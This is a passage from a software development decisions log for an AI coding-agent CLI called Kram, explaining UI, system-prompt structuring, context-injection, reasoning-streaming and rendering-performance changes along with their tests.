of this mutual-exclusion contract directly, rather than trusting the
6-second interval to make a double-poll bug show up in a fast test run.

---

## Terse glyph discipline for daemon notices

`renderToolActivity` gives every tool call a consistent, terse one-line
treatment — name, truncated args, a glyph distinguishing running/ok/
failed. Daemon notices (`EventNotice`, surfaced as `msg.Notices` in the
transcript) had no equivalent: every notice, regardless of what it
actually reported, rendered identically as `styleHint.Render("· "+n)` —
a stagnating retry loop read exactly the same as a routine "session
history was compacted."

Investigated what the daemon actually emits before adding a
classification scheme: `internal/daemon/agent`'s six `EventNotice`
call sites (`agent.go`'s image-capability fallback, compaction,
textual-tool-markup stop/normalize pair, stagnation detection; `retry.go`'s
transient-gateway-failure retry) are the complete, fixed set of notice
text Kram's daemon produces today — there is no `Kind` field on the
event, only free text, and adding one would be new daemon-side surface
this issue's own scope explicitly excludes ("no new information should
be surfaced that isn't already available; only how it's presented gets
unified").

`view.go` gains `noticeIsWarning(text string) bool`, matching against
`noticeWarnPhrases` — stable substrings of three of those six known
texts ("stagnation detected", "transient gateway failure", "Kram stopped
it") that flag a real problem, as opposed to the other three (compaction,
image fallback, markup silently normalized) which are routine. This is
explicitly a fixed-set match against known daemon text, not a general
classifier — the doc comment says so, so nobody mistakes it for one and
tries to make it smarter than the six-string universe it actually covers.
`renderNotice(text string) string` is the one function that turns a
notice into a transcript line — a plain hint-styled bullet for the
routine cases, `styleBadgeWarn`'s "⚠" for the three that warrant a second
look — replacing both call sites in `refreshTranscript` (the streaming
and settled-turn notice loops) that previously duplicated the same
`styleHint.Render("· "+n)` inline.

`TestNoticeIsWarningClassifiesKnownDaemonNotices` asserts against the
actual six strings copied verbatim from `agent.go`/`retry.go` — a
regression guard: if that text ever drifts, the test's expectations
should be revisited deliberately, not silently reclassified by an
unrelated wording change.

---

## Subagent sessions: a separate, opt-in picker view instead of live streaming

`delegate_task` runs a subagent to completion with `onEvent: nil`
(`RunTask`, `internal/daemon/agent/agent.go`) — every event a running
subagent would otherwise produce is silently dropped, so the parent
transcript shows nothing between `tool_start: delegate_task(...)` and
its eventual `tool_result`. The filed issue offered three options of
increasing scope (bounded live event summaries; a live-poll inspection
panel; after-the-fact browsing only) and recommended starting with the
lowest-risk one — no changes to the live event/streaming architecture at
all.

Checked the actual premise before designing anything, the same way #32's
terminal-color investigation did: `RunTask` already titles a subagent's
session `"subagent: " + goal` (truncated to 60 runes) via
`s.store.CreateSession`, and `Store.ListSessions`/`GetSession` return
every session unfiltered — a subagent session was **already** fetchable
by id and already appeared in the CLI's session picker (`picker.go`),
selectable via the exact same `enter` → `loadHistoryCmd` path as any
ordinary session. The issue's own "no change needed there" note about
`RunTask` was correct; `TestRunTaskSessionIsSubagentTitledAndFetchableByID`
(`internal/daemon/agent/service_coverage_test.go`) pins this directly —
`ListSessions`/`GetSession`/`ListMessages` all already work on a subagent
session with zero daemon-side special-casing.

So the real gap wasn't "undiscoverable" — it was the opposite: every
subagent session permanently and invisibly-in-plain-sight clutters the
*same* list as real conversations, indistinguishable at a glance except
by reading each title's text. A user who runs `delegate_task` often would
eventually be scrolling past dozens of "subagent: ..." rows to find a
real session.

`internal/cli/app/picker.go` gains `isSubagentSessionTitle` (checking the
`"subagent: "` prefix — duplicated from `store`'s own `isSubagentTitle`,
since the CLI only ever sees a title over the daemon's HTTP API, never
the store package directly) and `pickerVisibleSessions()`, which splits
`m.sessionList` by that check and returns only the half
`m.pickerShowSubagents` selects. The default view excludes subagent
sessions entirely — deliberately mirroring `session_search`'s own default
`SearchScopeUser` exclusion (`internal/daemon/store/search.go`), so the
picker and the model's own search tool agree on what counts as a "real"
session by default. The `"s"` key (`handlePickerKey`) toggles to a
dedicated subagent-only view — its own header ("sessões de subagentes")
and hint text, cursor reset to 0 on toggle since the two lists have
different lengths and lengths change independently. The default view's
hint line surfaces a count of hidden subagent sessions
(`pickerSubagentCount`) rather than going silent about their existence
entirely.

`enter` selection was refactored to read from `pickerVisibleSessions()`
instead of `m.sessionList` directly (both the cursor-bounds `itemCount`
computation and the actual row lookup), so the two can never drift out of
sync with each other.

`TestPickerVisibleSessionsExcludesSubagentsByDefault`,
`TestPickerSKeyTogglesToSubagentSessionsOnly`, and
`TestPickerEnterOnSubagentSessionOpensItLikeAnyOther`
(`internal/cli/app/picker_subagent_test.go`) cover the filter, the
toggle+cursor-reset, and that a subagent session opens through the exact
same `phaseChat`/`loadHistoryCmd` path an ordinary session already does —
no new loading code path, just a different filter over which sessions
reach the list.

Deliberately out of scope, per the issue's own recommendation: live event
streaming from a running subagent into the parent's own stream (options 1
and 2) — `RunTask`'s `onEvent: nil` is untouched. A user can browse a
subagent's session once it's finished (or, since nothing about reading is
special-cased, even mid-run — the daemon doesn't distinguish), but there
is still no live progress indicator in the parent transcript while
`delegate_task` is running. That remains a real gap for a future issue if
it turns out to matter in practice.

---

## Model/Agent Profile phase: `systemPrompt()` split into nine named sections

The Prompt Compiler v1 write-up already named this as its own deferred
next step: `base` (the hand-written identity/workflow/skills/memory/
delegation/asking/coding/output/safety template) was still one opaque
string, everything *around* it already a named, ordered `PromptPart`.
Section ownership (which text belongs to which concern) was only visible
by reading prose closely — the same class of problem the tools-overview
extraction had already fixed for tool guidance specifically.

`internal/daemon/agent/systemprompt.go`'s single `fmt.Fprintf` template
is now nine sections, each its own function or const —
`identitySection(workspace)` (the only one with real inputs; no `#`
header, since it's the opening frame every other section builds on),
`workflowSection`, `skillsSection`, `memoryPolicySection`,
`delegationSection`, `askingSection`, `codingPolicySection`,
`outputSection`, `safetySection` — each with a doc comment stating
exactly what it owns and, where it wasn't obvious, what distinguishes it
from its nearest neighbor (`workflowSection`'s tool-calling loop vs.
`codingPolicySection`'s house style for the code that loop produces;
`workflowSection`'s "report honestly" vs. `outputSection`'s answer
*form*). `systemPrompt(workspace)` itself stays — now just
`strings.Join` of the nine sections with `"\n"` — both as
`SystemPromptOverride`'s empty-means-this fallback and as the reference
string this file's own golden test compares against.

`promptcompiler.go` gains `compileBaseSections(workspace) []PromptPart`,
turning the nine sections into `PromptPart`s in the same order
`systemPrompt` joins them, IDed by section name (`"identity"`,
`"workflow"`, ...) — the issue's actual deliverable: ordering as an
explicit, inspectable list property instead of implicit in one template
string. `compilePreamble` calls it in the no-override case; when
`SystemPromptOverride` is set, behavior is unchanged from before this
issue — one `"base"` part, wholesale replacement, tools overview and
background-job guidance still generated normally alongside it (matching
the override's own DECISIONS entry above).

Deliberately **not** done, matching the issue's own scope: runtime plugin
registration. This is still a fixed, ordered list of named parts defined
in Go — just nine of them now instead of one — not a mechanism for
external code to register sections at runtime. Per-agent/subagent scoped
overrides and the `/debug prompt` view itself are both future work this
phase only makes possible, not built here.

**The byte-for-byte contract**: `TestCompileBaseSectionsMatchesSystemPrompt
ByteForByte` (`systemprompt_test.go`) joins the nine parts' `Content` with
`"\n"` and asserts equality against `systemPrompt(workspace)`'s own
output — this is a refactor, not a behavior change, in its first pass,
and passed on the first run once the nine section constants were copied
verbatim from the original template rather than retyped from memory
(retyping free text by hand is exactly the kind of place a stray comma or
em-dash swap silently breaks byte-identity).

**A real bug caught along the way, in a test rather than shipped code —
almost**: `context_usage.go`'s `ContextUsage` keyed its `"system_prompt"`
category directly off `partTokens["base"]`. That key only exists when
`SystemPromptOverride` is set; in the default (far more common) case,
`compilePreamble` now returns nine separately-IDed sections instead of
one `"base"` part, so the lookup would have silently reported 0 tokens
for the system prompt on every ordinary session — this one *did* almost
ship, caught only by deliberately grepping every `"base"` reference in
the package before considering the issue done, not by a pre-existing
test (none checked the category's value, only that the slice had at
least 5 entries). Fixed by summing every part **not** in the fixed set of
other named categories (`tools-overview`, `background-job-guidance`,
`project-context`, `memory`) — "whatever's left is the system prompt" —
rather than hardcoding the nine section IDs a second time in this file,
so a future phase adding another base section doesn't need a matching
update here to stay correct. `TestContextUsageSystemPromptCategoryIsNonZero`
(`service_coverage_test.go`) pins the regression directly.

Every other test asserting exact message indices against the assembled
preamble (`promptcompiler_test.go`'s part-count checks,
`promptassembly_test.go`'s real-`Service.Run` integration test) shifted
by `len(baseSectionOrder) - 1` (eight more parts than the old single
`"base"`) — updated to compute offsets from `len(baseSectionOrder)`
rather than hardcoded literals, so a tenth base section added later
doesn't silently desync these tests' expected indices from the real
assembled order again.

---

## Skip re-injecting unchanged project-context/memory: persist once, reuse from history

Project-context (AGENTS.md/CLAUDE.md) and memory were computed fresh and
resent as preamble system messages on every eligible turn/iteration
(`RefreshIteration`/`RefreshRun`), even when the content hadn't changed
since the model already saw it earlier in the same session — pure waste
against the context-window budget every single time, since Kram's model
calls are stateless completions: nothing about a previous call's
preamble carries forward on its own.

That statelessness is exactly why "skip resending, the model already has
it" can't just mean "omit the preamble part and trust the model to
remember" — a completions API genuinely doesn't remember anything not
present in *this* call's message array. The only way skipping is
behaviorally safe is if the content the model needs is still actually
present somewhere else in that array — meaning it has to live in
*persisted conversation history* (`s.store.AppendMessage`), which
`runLoop` already includes in full on every call via
`compaction.EffectiveHistory`/`toModelMessages`, not in the ephemeral,
recomputed-every-time preamble.

So the mechanism is: the first time (or whenever changed) project-context
or memory needs injecting, it's added to the preamble as before *and*
persisted as a real `store.Message{Role: "system", Name: <marker>}` —
`projectContextMarkerName`/`memoryMarkerName` (`promptcompiler.go`),
mirroring `compaction.CompactionMarkerName`'s existing tagging
convention. On a later eligible turn, before building a fresh preamble
part, `needsFreshInjection` (`promptcompiler.go`) scans **effective**
history via `lastMarkerContent` — the same "last one wins" scan shape
`compaction.EffectiveHistory` itself already uses — for the most recent
marker with that name. An exact content match still present there means
the model already has it, persisted, included in this call's history for
free; skip adding a fresh part. A mismatch (content changed) or no
marker found (never injected, or the marker fell out of the effective
window) means inject fresh, exactly as before.

**The trickiest part, solved for free**: what if compaction has pruned
the message that carried the last injection? `effective` here is already
the *post*-`compaction.EffectiveHistory`-truncation slice — anything
before the most recent compaction marker is already gone from it before
`needsFreshInjection` ever runs. A stale project-context/memory marker
from before a compaction naturally isn't found in the scan, so the
change-detection gate correctly reports "needs injection" without any
compaction-specific code in `needsFreshInjection` itself — reusing
`EffectiveHistory`'s own truncation turned out to *be* the compaction-
awareness the issue's own text worried this would need bespoke logic
for. `TestRunLoopReinjectsAfterCompactionPrunesThePriorMarker`
(`contextinjection_test.go`) pins this directly, simulating compaction by
appending a real compaction-marker message rather than fighting token-
budget thresholds to trigger one for real — isolates the actual mechanism
under test (the scan's truncation boundary) instead of depending on a
fragile token-count trigger.

`compilePreamble` itself needed no new parameters for any of this —
`haveProjectContext`/`haveMemory` were already its existing "include this
part or not" gates; `runLoop` (and `ContextUsage`, see below) now compute
those booleans as `haveX && needsFreshInjection(...)` before calling it,
instead of passing the raw "does this exist at all" value straight
through. `compilePreamble` stays exactly as pure as its own doc comment
already claimed — no change-detection logic leaked into it.

**A second real bug caught while wiring this up**: `ContextUsage`
(`context_usage.go`) calls `compilePreamble` too, for its context-budget
breakdown — and its `messageTokens` loop already counts *every* message
in `effective`, including a persisted project-context/memory marker, as
ordinary conversation content. Passing the raw unconditional
`haveProjectContext`/`haveMemory` through unchanged would have double-
counted those same tokens a second time under the `project_context`/
`memory` categories once a marker was persisted — silently inflating the
reported `used` total (and the footer's `◔ NN%` icon, which reads
straight off it) above what a real request would actually cost.
`ContextUsage` now runs the identical `needsFreshInjection` gate before
calling `compilePreamble`, so the category appears only when a turn
would really resend fresh content; once it's already persisted, those
tokens still count (via `messageTokens`, same as any other history
message), just without being double-attributed.
`TestContextUsageOmitsProjectContextCategoryOnceAlreadyPersisted` pins
both halves: the category disappears after the first turn persists the
marker, and `Used` doesn't drop (confirming no tokens were silently lost,
only recategorized).

**A third, unrelated-but-adjacent bug caught along the way**: persisting
these markers as real `store.Message{Role: "system"}` rows surfaced that
`internal/cli/app`'s `historyLoadedMsg` handler (`model.go`) never
filtered stored messages by role before rendering them — a `"system"`-
role message (compaction summaries already, now also these markers) fell
into `refreshTranscript`'s `default:` branch and rendered formatted
exactly like a real assistant reply, "kram" tag and all, on session
reopen. Fixed by skipping `Role == "system"` messages when building
`m.messages` from loaded history — a one-line fix that also retroactively
fixes the pre-existing compaction-marker case, not just the new markers
this issue adds. `TestPickerAccountsToolsAndWizardKeys`'s sibling history
test (`coverage_expansion_test.go`) gained a case pinning this: a
`"system"`-role message in the loaded history must not appear in
`m.messages` at all.

Deliberately unchanged, per the issue's own scope: `RefreshPolicy`'s
cadence semantics (project-context is still re-*evaluated* every
iteration, memory still frozen per run — this only changed whether an
evaluation that comes back identical actually gets resent) and
`RefreshStatic` parts (base sections, tools overview) — already computed
once per `Service` lifetime, so this specific waste never applied to
them.

---

## Surfacing streamed reasoning content in the live activity indicator

`provider.StreamEvent.Reasoning` already carried a reasoning-capable
model's live chain-of-thought fragments — but the only reader was
`router.BoundedPeek`, purely as a liveness signal ("the provider is still
producing tokens, not stalled"); the text itself was discarded
immediately after. `thinkingLine()` showed the same zero-content status
line whether or not a model was actively streaming visible reasoning.

**Premise check before touching anything** (same discipline as #32's
terminal-color investigation): does live per-token data from the gateway
actually reach the daemon at all today? Traced `Service.callModel`
(`internal/daemon/agent/agent.go`) and found the answer is "only when
`Config.PreferStreaming` is true" — and nothing in the shipped CLI,
wizard, or `daemon.Config` ever sets that field. The default path,
`bufferedCall`, makes one non-streaming gateway HTTP call and waits,
emitting only periodic `EventHeartbeat` pulses with zero per-token
signal of any kind, reasoning included — a single buffered HTTP
request/response has no incremental channel to relay anything live over,
regardless of what this issue changes. So this feature is real, tested,
and end-to-end correct, but — like `PreferStreaming` itself, which it
extends rather than newly introduces — dormant in every shipped
deployment today, exactly the way `streamCall` already was before this
issue. Implemented anyway: the issue's own text frames this as wiring
already-real data through, not adding a new capability, and the
plumbing is the same regardless of whether `PreferStreaming` gets a
CLI/config surface later.

**The chain, one additive hop at a time** — sender-side kept structurally
separate from Content/Delta at every layer (never risk a caller
concatenating reasoning into what looks like the model's actual answer,
the exact discipline `StreamEvent.Reasoning`'s own doc comment already
established for the provider layer):

1. `openai.ChatCompletionChunkDelta` gains `Reasoning string
   \`json:"reasoning,omitempty"\`` — same "new optional field, `omitempty`,
   doc comment" shape `ProviderItems` used when it was added.
2. `internal/server/chat.go`'s `streamResponse` gains `writeReasoning`, a
   sibling to `writeDelta` (not an overload — a shared "which field is
   this for" boolean parameter is exactly the kind of thing that invites
   the two getting swapped at a call site). `handle` calls it when
   `evt.Reasoning != ""`. No change needed in `router.BoundedPeek` or
   `streamResponse`'s replay of `peek.Buffered`: a reasoning-only event
   seen during the peek already lands in `buffered` (appended before the
   function's own liveness checks run), so it replays through `handle`
   for free once `handle` knows to read it.
3. `gatewayclient.StreamDelta` gains `Reasoning string`, populated in
   `ChatCompletionStream` from `choice.Delta.Reasoning` alongside the
   existing `Content` check (an `else if`, mirroring how `StreamEvent`
   itself treats Delta/Reasoning/ToolCallProgress as mutually exclusive
   per event).
4. `agent.Event` gains `Reasoning string` and a new `EventReasoning`
   kind — deliberately a distinct kind, not a flag on `EventDelta`, for
   the same never-concatenate-with-the-answer reason. `streamCall` emits
   it when `d.Reasoning != ""`. `bufferedCall` has nothing to emit here,
   consistent with the premise check above.
5. `internal/daemon/server/server.go`'s SSE `onEvent` switch gains
   `case agent.EventReasoning: writeEvent(map[string]any{"type":
   "reasoning", "content": evt.Reasoning})` — reusing the `"content"` key
   `"delta"` already uses, distinguished only by `"type"`, matching how
   `"notice"`'s `Text` and `"tool_result"`'s `Result` already reuse the
   same-shaped fields differentiated purely by type elsewhere in this
   switch.
6. `daemonclient.StreamEvent` needed no new field at all — `Content`
   already exists and `"reasoning"` decodes into it via the same generic
   `json.Unmarshal` `MessageStream.Next()` already does for every event
   type; only the type's doc comment gained a line documenting the new
   case.
7. CLI: `Model.reasoningPreview string` (new field) is set by
   `handleStreamEvent`'s new `"reasoning"` case and cleared by `"delta"`
   (real answer content started — the acceptance criterion "reverts to
   status-only once real content starts arriving"), `"tool_start"`, and
   `submit()` (a fresh turn shouldn't show a stale reasoning fragment
   from the previous one). `thinkingLine()` appends
   `" · pensando: " + boundedReasoningPreview(...)` to `meta`, gated on
   `workState == workModelActive && !stalled` — `boundedReasoningPreview`
   truncates to `reasoningPreviewMaxRunes = 50`, the same "a handful of
   words, not the full blob" discipline `renderToolActivity`'s own
   60-char args truncation already applies. The literal string
   `"pensando:"` is the marking `StreamEvent.Reasoning`'s doc comment
   asks every caller down the chain to preserve: unmistakably an excerpt
   of the model's thinking, never readable as its answer.

**Tests, one per hop plus the two the issue's own text asked for
explicitly**: `TestStreamingRelaysReasoningFragmentsAsDeltaChunks` +
`TestStreamingNonReasoningProviderUnaffected` (`internal/server/
chat_test.go`); `TestChatCompletionStreamRelaysReasoningFragments`
(`gatewayclient/stream_test.go`); `TestStreamCallEmitsReasoningEvent
SeparateFromDelta` (`agent/buffered_test.go`);
`TestHandleSendMessageRelaysReasoningEventOverSSE`
(`daemon/server/server_test.go`, via a new `newStreamingTestServer`
helper — `newTestServer`'s existing fake gateway always answers plain
JSON regardless of `req.Stream`, so a real SSE-speaking fake was needed
to exercise `PreferStreaming` at all); and CLI-side
`TestHandleStreamEventReasoningSetsPreviewWithoutTouchingMessageContent`,
`TestHandleStreamEventDeltaClearsReasoningPreview`,
`TestHandleStreamEventToolStartClearsReasoningPreview`,
`TestBoundedReasoningPreviewTruncatesLongText`, and
`TestThinkingLineShowsReasoningPreviewOnlyWhileModelActive`
(`internal/cli/app/reasoning_test.go`) — together covering every one of
the issue's own three stated test requirements: a reasoning-emitting
mock provider's fragments reaching the CLI-facing event stream, a
non-reasoning provider's stream staying byte-for-byte unaffected (every
pre-existing test in the full suite already covers this implicitly,
since every field added across all seven hops is `omitempty`/additive),
and the indicator correctly reverting to status-only once real content
arrives.

Deliberately out of scope, per the issue's own text: persisting
reasoning into session history (`ProviderItems`/encrypted reasoning
replay already solves continuity across turns; this is purely
presentational) and exposing `PreferStreaming` as an actual CLI/config
toggle — a real, separate piece of work this issue's plumbing now sits
ready for, but not something this issue's own scope asked for.

---

## Live indicator: the product's own name instead of an abstract glyph

The live activity indicator (`renderThinkingK`, `internal/cli/app/
shimmer.go`) rendered a two-Braille-cell K glyph (`⡧⡎`) — a real, deliberately-
designed silhouette (see its prior doc comment on the 4x4 dot matrix), but
abstract: it read as "a K shape," not as the product name, and the
emphasis-cycling effect on only two points was subtle.

Replaced with the literal word "kram": `thinkingKPlain()` now returns
`"kram"` instead of the Braille pair, and `renderThinkingK` uppercases
exactly one letter per frame — cycling `Kram` → `kArm` → `kaRm` → `kraM`
→ repeat, "one letter growing" each frame, matching the mockup this was
requested against directly. The color gradient sweep is unchanged in
kind, only extended: the smooth path now uses the same continuous
per-character phase formula `shimmerText` itself already uses
(`i/len * 2π + frame*0.35`) across all four letters, rather than the old
two-point glyph's `i*math.Pi` hard alternation — with only two points
that alternation read as a genuine two-color flip, but stretched across
four letters it would've looked like a checkerboard instead of a moving
gradient, so the smoother formula was the correct generalization, not
just a mechanical copy-paste of the old phase math. The coarse (limited-
color-terminal) fallback keeps its existing two-fixed-color-by-parity
treatment unchanged in shape, just across four letters instead of two.
Stalled state is unchanged in spirit: still one `styleBadgeWarn.Bold(true)`
call around the whole word, just the word itself instead of the glyph.

**Test rewrite, not just renaming**: the old
`TestThinkingKIsDenseAndSingleLine` asserted `lipgloss.Width == 2` and a
9-Braille-dot count via `bits.OnesCount` — both meaningless for a 4-letter
word, so replaced outright rather than patched. The harder part was
`strings.Contains(got, thinkingKPlain())`-style assertions: the old glyph
rendered fine as a byte-for-byte substring check even under per-rune
ANSI styling (edge case: at any given frame only one of two points is
bold, but this project's own past debugging established that lipgloss
under `go test`'s non-TTY environment resolves to a no-color profile, so
`Foreground()` calls are no-ops and only `Bold()`'s SGR codes actually
wrap anything) — for four letters synonymous logic still holds, but
asserting "spells kram" needed `ansi.Strip` first rather than raw
substring matching, since a differently-cased letter breaks a literal
`Contains(..., "kram")` check regardless of ANSI. New
`TestThinkingKSpellsKramWithOneLetterUppercasedPerFrame` strips ANSI,
lowercases, and asserts the result equals `"kram"` with exactly one
uppercase rune, across the same `frame := -1; frame < 12` sweep the old
test used — same coverage shape, correct assertions for the new content.

---

## Making the streaming path (and its reasoning indicator) actually reachable

#28's reasoning-indicator work was real and tested but dormant: it only
fires on `streamCall`, reached only when `Config.PreferStreaming` is
true, and nothing in the deployed daemon ever set that. Confirmed by a
user actually running the built binary and reporting no "pensando: ..."
text ever appeared — the premise-check note in #28's own DECISIONS entry
predicted exactly this.

`internal/daemon/daemon.go`'s `Run` — the one real `agent.Config{...}`
construction site both `cmd/daemon` and `cmd/kram`'s in-process daemon
go through — now sets `PreferStreaming: true`. `PreferStreaming`'s own
doc comment on the field itself is deliberately left unchanged: it still
honestly describes the field as an opt-in escape hatch, "False (buffered)
is what almost every caller wants." That's still true of the *field*;
this is the one call site that makes the different choice for the real,
deployed daemon, and the comment at that call site is where the
tradeoff being accepted lives — not a rewrite of what the field means in
general.

The tradeoff is real and worth restating plainly: streaming commits to
the first candidate `router.BoundedPeek` sees a meaningful signal from —
if that candidate then fails mid-stream, the whole turn fails with it,
since HTTP headers are already sent and kram-gateway has no further
fallback available. The buffered path doesn't have that problem (every
ranked candidate is tried to completion before anything is written back).
Turning streaming on by default trades some of that resilience for the
reasoning indicator (and generally snappier perceived latency, since
content now arrives token-by-token instead of only once the whole
buffered call finishes) actually working. Accepted deliberately, at the
user's explicit request, not a default anyone should assume is risk-free.

`TestRunDefaultsToStreamingGatewayPath` (`internal/daemon/daemon_test.go`)
is the regression test: a real `Run()` against a real SSE-capable fake
gateway, asserting the captured request actually carried `Stream: true`
— proving the real deployment wiring makes this choice, not just that
the field can be set in principle (that half was already covered by
#28's own `buffered_test.go` tests).

---

## Inline preview of a finished tool call's output

`renderToolActivity` showed only `name(args) ✓/✗` — the actual result
content (`daemonclient.ToolActivity.Result`, already fetched from
`EventToolResult` and stored on the model) was discarded from the CLI's
perspective. A user watching a turn run had no way to see what a
`bash`/`grep`/`read_file` call actually printed without asking the model
to repeat it — flagged directly by a user comparing against Codex CLI's
own inline output preview.

`renderToolResultPreview` (`internal/cli/app/view.go`) shows up to
`toolResultPreviewMaxLines` (4) lines of a finished call's `Result`,
ANSI-stripped (`ansi.Strip`, ripping out any raw color/control codes a
shell command's own output might carry) and each line capped to
`toolResultPreviewMaxWidth` (100) runes — a "+N linhas" suffix when
truncated, the same overflow-suffix convention `renderFilesTouched`
already established. Gated on `!act.Running && act.ProcessID == ""`:
a still-running call has no result yet to preview (see the honest
limitation below), and a `run_background` process already has its own
dedicated live observer (Ctrl+B) that's a strictly better place to watch
its output than a static excerpt frozen at start time would be.

**A real, explicitly-named limitation, not silently punted**: this is a
preview of a *finished* call's output, not a live-growing one. Kram's
tool execution doesn't stream partial stdout/stderr mid-call today —
adding that would mean a new daemon-side event kind carrying incremental
output chunks per (non-background) tool call, real new plumbing on the
execution side of every tool, not a CLI-only rendering change. Told to
the user directly rather than half-implementing something that looks
live but isn't: what shipped here is the achievable half of "like Codex"
with current data, not the whole thing.

---

## Two real bugs a user caught live: clipped transcript lines, choppy indicator

A user ran the actual built binary and pasted screenshots. Two concrete,
verifiable problems came out of that — the kind of bug that's easy to
miss reading code in isolation and obvious the moment someone's real
terminal shows it.

**Clipped, not wrapped, transcript lines.** Opening the Ctrl+B process
observer narrows the chat viewport (`chatViewportWidth`,
`processpanel.go`) so the tiled process pane has room. Three pieces of
transcript content were never width-aware against that narrower value:

- A still-streaming message's plain-text content (`refreshTranscript`'s
  `case msg.streaming:`) had **no width constraint at all** — unlike the
  finished-message path, which glamour already wraps at `m.mdRenderer`'s
  configured width. bubbles' own `viewport.Model` doesn't wrap an
  overflowing line on its own; it clips it, silently dropping whatever
  didn't fit. The screenshot showed exactly this: "...exatamente p" with
  the rest of the sentence gone.
- `renderToolActivity`'s args truncation was a **fixed 60-rune cap** —
  fine on a wide terminal, still wider than a tiled 40-column chat
  column.
- The tool-result preview from the previous entry used a **fixed
  100-rune cap** — same problem, freshly introduced by that same change.

Fixed by making all three derive their limit from the actual current
`m.viewport.Width` instead of a bare constant: `styleBody.Width(w)` now
wraps streaming content properly (lipgloss's own word-wrap, the same
mechanism `renderProcessPane`'s tiled pane already relies on for its
bordered layout, so this isn't a new technique — just applied somewhere
it was missing); `toolActivityArgsLimit`/the preview's width computation
both cap at `min(originalTunedMax, max(floor, viewportWidth-overhead))`
— narrowing correctly when tiled, never exceeding the original tuned
maximum on a wide terminal so neither line tries to fill unnecessary
horizontal space. `truncateToWidth` is the one shared rune-bounded
"…"-suffixed helper both call sites now use, replacing two near-
duplicate truncation loops.

`TestStreamingContentWrapsToNarrowViewport` is the regression test that
actually matters here — it doesn't just check line width (bubbles'
`View()` clips to width regardless of whether the underlying content was
pre-wrapped, so a width-only assertion would pass even with the bug
still present), it counts occurrences of a repeated marker word in the
rendered output and asserts none were lost, which is the actual
observable symptom a user hit. `TestRenderToolResultPreviewTruncatesWide
LineToViewportWidth` and `TestRenderToolActivityArgsTruncatesToNarrowVi
ewport` cover the other two spots the same way, forcing a narrow
`m.viewport.Width` directly rather than going through the full tile-mode
layout machinery.

**Choppy "kram" indicator, "quero... como uma onda."** The letter-
cycling wordmark (see the entry above on replacing the Braille K) ran at
the original 120ms tick rate inherited from before that change — with a
4-letter word and the `frame/2` active-index cadence, that's a visible
jump roughly once per second per letter, reported directly as feeling
"travada" (stuck/janky), not the intended continuous wave motion.

`animTickInterval` (`commands.go`) dropped from 120ms to 50ms — more
frequent frames, sampling the same underlying animation more densely
rather than literally speeding it up. The distinction matters: naively
lowering the tick interval alone, with every consumer's per-frame
constant left as a hardcoded number tuned against the old 120ms
baseline, would have silently sped up *every* shimmer/pulse animation in
the app by the same ~2.4x factor (shimmerText's general use, the route
bar's own pulse dot, the activity rail) — a correctness bug of exactly
the same shape as `PreferStreaming`'s "one hop changes, downstream
assumptions don't automatically follow" pattern seen elsewhere this
session. Instead, `shimmer.go` gained two tick-rate-derived package vars:
`shimmerPhasePerFrame` (rescales the old `*0.35` phase-per-frame constant
against `animTickInterval`, preserving the original ~2.9 rad/s real-time
sweep speed at whatever tick rate is configured) and `activeStepFrames`
(rescales the old hardcoded `frame/2` active-index divisor the same way,
preserving the original ~240ms dwell time per active node/letter).
`shimmerText`, `renderThinkingK`, `renderActivityRail`, and routebar.go's
pulse dot all switched from their old hardcoded `0.35`/`frame/2` to these
shared, derived values — one source of truth for "how fast does
animation actually move," decoupled from "how often is it sampled,"
instead of four independently-tuned magic numbers that would drift out
of sync the next time either changes.

---

## The real cause of the "camera lenta" feeling: refreshTranscript on every tick

The tick-rate/rescale fix above didn't actually fix what the user was
seeing — a second report came back: still choppy, and user prompts were
now *also* getting clipped in the tiled view (a second instance of the
class of bug the previous entry fixed elsewhere). Both turned out to be
real, and neither was where the first pass looked.

**Root cause #1, the actual performance bug**: `animTickMsg`'s handler
called `m.refreshTranscript()` — the *entire* transcript rebuild — on
every single animation frame. `BenchmarkRefreshTranscriptLongSession`
(new, `internal/cli/app/transcript_perf_test.go`) measured this at
~16-18ms on an 80-message session with markdown and tool activity, on a
machine slower than the one that actually produced the bug report (a
242k-token real session, far larger than the benchmark's 40-turn
fixture). At the 50ms tick interval the previous entry had just
introduced *for smoothness*, that's over a third of the entire frame
budget spent re-parsing glamour markdown and re-rendering tool-activity
rows for messages that hadn't changed at all since the last frame — the
raised tick rate didn't make the animation smoother, it made the
existing per-frame cost happen 2.4x more often, which reads as exactly
the "slow motion / travada" feeling reported. Bumping tick rate without
first checking what runs on each tick was the mistake here, the same
category of "one hop changes, a downstream assumption doesn't
automatically follow" already named a few entries up regarding
`PreferStreaming`.

The fix rests on one structural fact: **only the tail message can
contain anything animFrame-dependent** — the thinking line, or a running
tool call's live spinner glyph. Every earlier message's turn already
finished and never changes again. So `refreshTranscript` now splits at
that boundary: static messages (`m.messages[:n-1]` when the tail is
still streaming) are rendered once into a cached `m.transcriptBody`;
`renderMessageBlock` (new) is the one place a single message's own
rendering logic lives — user prompt block, or tool-activity/content/
notices for an assistant message — called both by `refreshTranscript`'s
static-prefix loop and by `applyTranscriptContent`'s tail re-render, so
the two paths can never drift into rendering the same message
differently. `refreshLiveIndicator` (new, `animTickMsg`'s actual handler
now) calls `applyTranscriptContent` directly, skipping the static loop
entirely — measured at ~0.65ms per tick on the same session shape via
`BenchmarkRefreshLiveIndicatorLongSession`, a ~28x reduction, from ~37%
of the tick budget down to ~1.3%.

`processLinkRows` (the `bgN` → process-ID map `handleMouse` reads to open
the process panel on click) needed the same treatment: it's built
per-message with row numbers *local* to that message's own block, then
offset by however many lines came before it — `m.transcriptBodyLinkRows`
caches the static prefix's rows, and `applyTranscriptContent` merges in
the tail block's own (freshly computed each call, correctly offset)
rows every time, so a `run_background` link in a still-running turn
stays clickable through every animation frame, not just the ones a full
refresh happened to land on.

**A real mistake caught before it shipped, not after**: the first draft
of this split cached everything *except* the trailing thinking-line
suffix specifically — which would have frozen a still-running tool
call's spinner glyph, since `renderToolActivity`'s `m.spin.View()` call
is embedded *inside* the tail message's own block (via its tool-activity
rows), not just in the trailing suffix after it. Traced by checking what
`spinner.TickMsg`'s own handler (`model.go`) actually does to the
transcript — nothing; it only advances `m.spin`'s internal frame state,
relying entirely on *something else* re-rendering the transcript
periodically to actually show the new spinner glyph, which turned out to
be `animTickMsg`'s own full refresh doing double duty this whole time.
Caught by tracing that chain before committing to the naive split, not
by a test catching it after. `TestRefreshLiveIndicatorAnimatesRunningTool
Spinner` pins it directly: eight animation frames with a running tool
call must produce at least two visibly different renders, not a frozen
one. `TestRefreshLiveIndicatorDoesNotRebuildStaticBody` pins the other
half of the contract — `m.transcriptBody` itself must never change
